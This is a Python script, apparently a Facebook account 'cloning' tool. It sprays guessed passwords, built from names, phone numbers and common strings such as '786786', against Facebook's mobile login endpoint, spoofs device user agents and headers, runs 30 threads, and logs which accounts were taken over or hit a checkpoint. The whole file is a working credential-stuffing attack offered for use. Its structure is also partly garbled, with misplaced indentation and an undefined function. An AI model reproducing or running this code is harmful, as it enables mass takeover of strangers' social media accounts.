# Decode By Error x Ethan 
# Owner: Charsi / Mystery - Updated 2025
global loop, twf, cps, oks
try:
    import os, requests, json, time, re, random, sys, uuid, mechanize, string, subprocess, bs4, urllib3, rich, base64, platform, httplib2, arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from datetime import datetime
except: pass

def getKey():
    myid = str(os.getuid()).upper()[::(-1)]
    plat = platform.version()[2:][:8][::(-1)].upper() + platform.release()[3:][::(-1)].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('.', '')
    return 'GEN-' + myid + xp

def generate_ua():
    android_ver = random.choice(['12', '13', '14', '15'])
    brand = random.choice(['Samsung', 'Xiaomi', 'Infinix', 'Tecno', 'Vivo', 'Google'])
    model = random.choice(['SM-S928B', 'SM-G998B', '23127PN0CG', 'X6833B', 'KJ5', 'V2303', 'Pixel 8 Pro'])
    chrome = f"{random.randint(125, 131)}.0.{random.randint(6000, 7000)}.{random.randint(100, 160)}"
    fb_v = f"{random.randint(450, 500)}.0.0.{random.randint(10, 99)}"
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{random.randint(500000000, 600000000)};FBDV/{model};FBMD/{brand};FBSN/Android;FBSV/{android_ver};FBOP/19]'

def logo():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| \033[1;37m(V2-UPDATED)
----------------------------------------------
 OWNER   :  CHARSI / MYSTERY
 TOOL    :  FILE CLONING / RANDOM
 STATUS  :  LATEST UA & METHODS (2025)
----------------------------------------------''')
def ___M_T_H_D_1___(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mGEN\033[1;90m] %s | OK:- %s | CP:- %s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln)
            ua = generate_ua()
            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': ua,
                'X-FB-Net-HNI': str(random.randint(20000, 45000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 45000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'Keep-Alive'
            }
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'email': ids, 'password': pas, 'generate_session_cookies': '1',
                'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate'
            }
            response = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            if 'session_key' in response:
                print(f'\r\r \033[1;32m[GEN-OK] {ids} | {pas}')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(response):
                print(f'\r\r \033[1;33m[GEN-CP] {ids} | {pas}')
                cps.append(ids)
                break
        loop += 1
    except: pass
    def On():
    logo()
    print(' [1;32m[1] FILE CLONING (FAST)')
    print(' [1;32m[2] RANDOM CLONING (MIX)')
    print(' [1;32m[3] CHECK OK/CP RESULTS')
    print(' [1;32m[4] CONTACT OWNER')
    print(' [1;32m[0] EXIT TOOL')
    line()
    choice = input(' [•] CHOOSE OPTION: ')
    if choice == '1':
        file_cloning()
    elif choice == '2':
        random_cloning()
    elif choice == '3':
        print(' [•] 1. CHECK OK RESULTS');print(' [•] 2. CHECK CP RESULTS')
        ch = input(' [•] CHOOSE: ')
        if ch == '1': os.system('cat /sdcard/GEN-OK.txt')
        else: os.system('cat /sdcard/GEN-CP.txt')
        input(' [•] PRESS ENTER');On()
    elif choice == '0':
        exit()
    else:
        On()

def file_cloning():
    logo()
    print(' [•] EXAMPLE: /sdcard/ids.txt')
    file = input(' [•] ENTER FILE PATH: ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(' [!] FILE NOT FOUND');time.sleep(2);On()
    
    line()
    print(' [•] EXAMPLE: first123,first1234,786786')
    pws = input(' [•] ENTER PASSWORDS: ')
    passlist = pws.split(',')
    
    with tred(max_workers=30) as pool:
        logo()
        print(f' [•] TOTAL IDS : {len(fo)}')
        print(f' [•] METHOD    : M1 / UPDATED')
        line()
        for user in fo:
            try:
                ids, names = user.split('|')
                pool.submit(___M_T_H_D_1___, ids, names, passlist)
            except: pass
    
    exit('\n [•] CLONING COMPLETED')
    def random_cloning():
    logo()
    print(' [•] EXAMPLE: 0300,0301,0345')
    code = input(' [•] ENTER NETWORK CODE: ')
    print(' [•] EXAMPLE: 5000, 10000, 20000')
    limit = int(input(' [•] ENTER LIMIT: '))
    
    with tred(max_workers=30) as pool:
        logo()
        print(f' [•] TARGET CODE : {code}')
        print(f' [•] TARGET LIMIT: {limit}')
        line()
        for i in range(limit):
            ids = code + str(random.randint(1111111, 9999999))
            names = "Random User"
            passlist = [ids, ids[:6], ids[:7], 'pakistan', '786786']
            pool.submit(___M_T_H_D_1___, ids, names, passlist)
            
    exit('\n [•] RANDOM CLONING FINISHED')

def tutulx(uid):
    # Year checker logic from original script
    if len(uid) == 15:
        if uid.startswith('100000'): year = '2009'
        elif uid.startswith('10000'): year = '2010'
        else: year = 'OLD'
    else: year = 'NEW'
    return year

if __name__ == '__main__':
    try:
        # Initializing main global variables
        loop = 0
        oks = []
        cps = []
        twf = []
        On()
    except Exception as e:
        print(f' [!] ERROR: {e}')
        